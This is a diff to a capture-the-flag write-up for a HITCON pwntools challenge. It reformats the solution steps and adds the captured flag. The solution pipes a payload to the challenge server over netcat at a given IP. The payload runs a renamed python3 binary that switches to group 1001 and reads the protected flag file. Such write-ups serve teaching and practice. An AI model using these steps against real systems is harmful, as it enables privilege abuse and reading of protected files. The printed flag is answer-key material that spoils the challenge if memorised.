@@ -9,8 +9,10 @@ Categories:
 ## Solution
 
 ```
-$ printf $'131\n/home/deploy/secret_python_others_should_never_know -c \'__import__("os").setgid(1001);print(open("/home/deploy/flag").read())\' 1>&2\n' | nc 3.115.58.219 9427
+$ nc 3.115.58.219 9427
 ELF size? (MAX: 6144)
+131
+/home/deploy/secret_python_others_should_never_know -c '__import__("os").setgid(1001);print(open("/home/deploy/flag").read())' 1>&2
 [*] Version of pwntools: 4.3.0
 [x] Opening connection to 127.0.0.1 on port 1337
 [x] Opening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1
@@ -40,9 +42,11 @@ exploiter:x:1001:1001:,,,:/home/exploiter:/bin/bash
 So now we just run `secret_python_others_should_never_know` which is basically a copy of the `python3` binary:
 
 ```
-import os
-os.setgid(1001)
-os.system('cat /home/deploy/flag')
+$ secret_python_others_should_never_know
+>>> import os
+>>> os.setgid(1001)
+>>> os.system('cat /home/deploy/flag')
+hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
 ```
 
 (^ expanded payload)
